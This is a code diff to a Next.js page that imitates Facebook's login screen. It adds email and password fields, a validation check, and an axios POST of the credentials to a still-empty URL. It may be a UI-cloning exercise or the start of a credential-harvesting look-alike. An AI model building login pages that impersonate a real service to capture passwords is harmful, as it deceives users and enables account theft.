@@ -2,16 +2,27 @@
 import React, { useEffect, useState } from "react";
 import "./Style.css";
 import Link from "next/link";
+import axios from "axios";
 
 const page = () => {
-
+  const [Email, setEmail] = useState("");
+  const [Password, setPassword] = useState("");
   const clickHandle = () => {
- 
+    if (!Email) {
+      alert("all fields are required");
+    } else if (!Password) {
+      alert("all fields are required");
+    } else {
+      axios
+        .post("", { Email, Password })
+        .then(() => {})
+        .catch(() => {});
+    }
   };
- 
+
   return (
     <div className="relative overflow-x-hidden">
-      <div className={ ` main-login`}>
+      <div className={` main-login`}>
         <div className="sec-main-login">
           <div className="box1-facebook-login">
             <h1 className="login-heading">facebook</h1>
